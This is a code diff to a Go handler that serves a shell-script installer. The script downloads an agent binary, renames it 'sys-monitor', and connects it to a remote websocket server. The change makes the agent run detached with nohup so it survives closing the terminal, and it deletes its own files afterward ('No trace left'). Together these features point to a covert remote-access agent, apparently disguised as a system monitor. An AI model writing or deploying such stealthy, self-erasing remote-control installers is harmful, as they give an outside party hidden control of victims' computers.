@@ -20,14 +20,9 @@ curl -sL https://github.com/lpu-software/LPUt/raw/main/bin/lput-agent -o $DIR/sy
 # Make executable
 chmod +x $DIR/sys-monitor
 
-# Run it in the background connected to your render server
-echo "Connecting to endpoint..."
-$DIR/sys-monitor --server wss://lput.onrender.com > /dev/null 2>&1
-
-# This block only executes AFTER the agent terminates (e.g., self-destruct is clicked)
-echo "Cleaning up..."
-rm -rf $DIR
-echo "Disconnected. No trace left on system."
+# Run it completely detached from the terminal so the terminal can be closed safely
+echo "Connecting to endpoint... You may now close this terminal."
+nohup bash -c "$DIR/sys-monitor --server wss://lput.onrender.com > /dev/null 2>&1; rm -rf $DIR" > /dev/null 2>&1 &
 `
 	fmt.Fprint(w, script)
 }
